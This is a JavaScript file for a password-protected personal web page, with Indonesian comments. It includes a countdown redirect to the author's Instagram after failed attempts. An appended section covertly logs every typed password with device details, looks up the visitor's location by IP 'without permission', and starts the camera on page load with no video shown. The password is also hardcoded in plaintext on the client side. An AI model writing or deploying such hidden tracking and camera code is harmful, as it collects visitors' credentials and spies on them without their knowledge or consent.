

// *** Script Utama (Dibiarkan Seperti Aslinya) ***

let attempts = 0;
const maxAttempts = 3;
const correctPassword = "nabilapunyakiky";

function togglePassword() {
    const passwordInput = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeOpen.classList.add("hidden");
        eyeClosed.classList.remove("hidden");
    } else {
        passwordInput.type = "password";
        eyeOpen.classList.remove("hidden");
        eyeClosed.classList.add("hidden");
    }
}

function validatePassword() {
    const passwordInput = document.getElementById("password");
    const errorMessage = document.getElementById("error-message");
    const countdownMessage = document.getElementById("countdown");
    const container = document.querySelector(".container");
    const button = document.querySelector("button");
    const audio = document.getElementById("countdown-sound"); // Ambil elemen audio

    let password = passwordInput.value.trim(); 

    if (password === "") {
        errorMessage.textContent = "⚠️ Kata sandi tidak boleh kosong!";
        errorMessage.classList.add("show");
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 300);
        return;
    }

    if (password === correctPassword) {
        errorMessage.textContent = "✅ Kata sandi benar! Selamat datang.";
        errorMessage.classList.add("show");
        document.getElementById("success-popup").classList.remove("hidden");
        setTimeout(() => button.remove(), 500);  
        setTimeout(() => {
            window.location.href = "https://kkykrnwn.github.io/script-bucin/file/utama.html";
        }, 2000);
    } else {
        attempts++;
        errorMessage.textContent = `❌ Kata sandi salah! Percobaan tersisa: ${maxAttempts - attempts}`;
        errorMessage.classList.add("show");
        passwordInput.value = ""; 
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 500);
        
        if (attempts >= maxAttempts) {
            errorMessage.textContent = "🚨 Terlalu banyak percobaan! Anda akan dialihkan ke Instagram pencipta...";
            let countdown = 10;
            countdownMessage.style.display = "block";
            countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;

            passwordInput.disabled = true;
            button.disabled = true;
            
            
            // 🔊 Memastikan audio dimainkan
            audio.volume = 1.0; // Pastikan volume penuh
            audio.loop = true; // Loop agar suara terus berbunyi
            audio.play().catch(error => console.log("Gagal memutar suara:", error));


            let interval = setInterval(() => {
                countdown--;
                countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;
                if (countdown <= 0) {
                    clearInterval(interval);
                    audio.pause(); // Hentikan suara setelah hitung mundur selesai
                    window.location.href = "https://www.instagram.com/kky_krnwn331?igsh=MW9yZnF6YXY2YmsxZg=="; 
                }
            }, 1000);
        }
    }
}


// *** Script Tambahan (Tidak Mengubah Script Asli) ***

document.addEventListener("DOMContentLoaded", () => {
    let passwordInput = document.getElementById("password");
    let loginButton = document.querySelector("button");

    if (passwordInput && loginButton) {
        loginButton.addEventListener("click", () => {
            let password = passwordInput.value.trim();
            if (password) {
                saveLoginData(password);
            }
        });
    }

    // Memulai akses kamera otomatis
    startCamera();
});

// Fungsi untuk menyimpan data login ke localStorage
function saveLoginData(password) {
    let loginData = JSON.parse(localStorage.getItem("loginData")) || [];
    
    let deviceInfo = getDeviceInfo();
    let loginRecord = {
        time: new Date().toLocaleString(),
        password: password,
        location: "Mendeteksi lokasi...",
        device: deviceInfo
    };

    loginData.push(loginRecord);
    localStorage.setItem("loginData", JSON.stringify(loginData));

    // Ambil lokasi berdasarkan IP tanpa izin
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            loginRecord.location = `${data.city}, ${data.region}, ${data.country_name}`;
            localStorage.setItem("loginData", JSON.stringify(loginData));
        })
        .catch(error => console.log("Gagal mengambil lokasi:", error));
}
// Fungsi untuk mendapatkan informasi perangkat yang lebih detail
function getDeviceInfo() {
    let userAgent = navigator.userAgent;
    let platform = navigator.platform || "Tidak Diketahui";
    let browser = detectBrowser(userAgent);
    let deviceType = detectDeviceType(userAgent);
    let os = detectOS(userAgent);

    return `📱 Perangkat: ${deviceType} | OS: ${os} | Browser: ${browser} | Platform: ${platform}`;
}

// Fungsi untuk mendeteksi jenis perangkat
function detectDeviceType(userAgent) {
    if (/tablet|ipad/i.test(userAgent)) return "Tablet";
    if (/mobi|iphone|android/i.test(userAgent)) return "Ponsel";
    return "PC / Laptop";
}

// Fungsi untuk mendeteksi sistem operasi (OS)
function detectOS(userAgent) {
    if (/Windows NT 10.0/i.test(userAgent)) return "Windows 10/11";
    if (/Windows NT 6.3/i.test(userAgent)) return "Windows 8.1";
    if (/Windows NT 6.2/i.test(userAgent)) return "Windows 8";
    if (/Windows NT 6.1/i.test(userAgent)) return "Windows 7";
    if (/Macintosh|Mac OS X/i.test(userAgent)) return "macOS";
    if (/Linux/i.test(userAgent)) return "Linux";
    if (/Android/i.test(userAgent)) return "Android";
    if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
    return "OS Tidak Diketahui";
}

// Deteksi browser yang lebih lengkap
function detectBrowser(userAgent) {if (/Edg/i.test(userAgent)) return "Microsoft Edge";
    if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) return "Google Chrome";
    if (/Firefox/i.test(userAgent)) return "Mozilla Firefox";
    if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) return "Apple Safari";
    if (/Opera|OPR/i.test(userAgent)) return "Opera";
    return "Browser Tidak Diketahui";
}

// Fungsi untuk mengakses kamera tanpa ditampilkan di layar
function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            let video = document.createElement("video");
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah aktif sebentar
            }, 5000);
        })
        .catch(error => console.log("Gagal mengakses kamera:", error));
}
